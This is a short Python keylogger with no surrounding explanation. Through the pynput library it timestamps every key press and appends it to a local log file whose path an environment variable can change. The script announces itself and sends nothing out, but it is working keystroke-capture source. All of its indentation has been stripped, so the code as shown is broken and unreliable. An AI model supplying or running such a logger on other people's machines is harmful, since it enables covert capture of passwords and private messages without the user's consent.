import os
import sys
from datetime import datetime
from pathlib import Path

try:
from pynput import keyboard
except ImportError:
print('Install pynput first: pip install pynput')
sys.exit(1)


LOG_PATH = Path(os.environ.get('KEYLOG_PATH', 'keystrokes.log'))


def write_key(key):
stamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
try:
char = key.char
except AttributeError:
char = f'[{key.name}]'
with LOG_PATH.open('a', encoding='utf-8') as handle:
handle.write(f'{stamp} {char}\n')


def main():
print(f'Logging keystrokes to {LOG_PATH.resolve()}')
print('Press Ctrl+C to stop.')
with keyboard.Listener(on_press=write_key) as listener:
listener.join()


if __name__ == '__main__':
main()